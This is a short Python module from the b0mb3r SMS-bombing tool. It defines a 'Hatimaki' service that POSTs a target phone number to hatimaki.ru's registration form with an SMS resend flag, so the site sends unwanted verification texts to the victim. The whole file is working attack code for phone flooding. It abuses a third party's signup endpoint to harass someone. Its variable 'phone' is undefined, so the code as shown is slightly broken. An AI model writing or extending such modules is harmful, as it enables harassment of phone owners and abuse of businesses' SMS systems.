from b0mb3r.services.service import Service


class Hatimaki(Service):
    async def run(self):
        await self.post(
            "https://www.hatimaki.ru/register/",
           data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONALphone]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"},
        )
